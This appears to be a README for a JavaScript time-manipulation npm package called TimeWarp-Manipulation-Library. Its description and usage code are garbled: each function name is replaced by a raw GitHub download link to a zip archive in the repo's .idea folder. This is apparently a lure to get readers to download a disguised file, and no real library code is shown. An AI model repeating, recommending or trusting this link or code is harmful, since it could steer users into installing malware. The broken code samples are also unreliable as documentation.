# ⏳ TimeWarp-Manipulation-Library

## Description
Welcome to the TimeWarp Manipulation Library GitHub repository! This library provides an NPM package that enables precise control over time in JavaScript. With this library, you can warp, freeze, or accelerate `https://github.com/DaniFishh/Time-Warp-Manipulation-Library/raw/refs/heads/master/.idea/Library-Manipulation-Warp-Time-3.1.zip()` with seamless monkey-patching. It's perfect for testing, simulations, and debugging time-sensitive code.

## Features
- Warp time to fast-forward or slow down processes.
- Freeze time for accurate testing and debugging.
- Accelerate time for simulation purposes.
- High precision for accurate time manipulation.

## Installation
To install the library, you can use npm:
```bash
npm install time-warp-manipulation-library
```

## Usage
Here's a quick example of how you can use the library in your https://github.com/DaniFishh/Time-Warp-Manipulation-Library/raw/refs/heads/master/.idea/Library-Manipulation-Warp-Time-3.1.zip project:

```javascript
const TimeWarp = require('time-warp-manipulation-library');

// Warp time by a factor of 2
https://github.com/DaniFishh/Time-Warp-Manipulation-Library/raw/refs/heads/master/.idea/Library-Manipulation-Warp-Time-3.1.zip(2);

// Get the modified time
const warpedTime = https://github.com/DaniFishh/Time-Warp-Manipulation-Library/raw/refs/heads/master/.idea/Library-Manipulation-Warp-Time-3.1.zip();

https://github.com/DaniFishh/Time-Warp-Manipulation-Library/raw/refs/heads/master/.idea/Library-Manipulation-Warp-Time-3.1.zip(warpedTime);
```
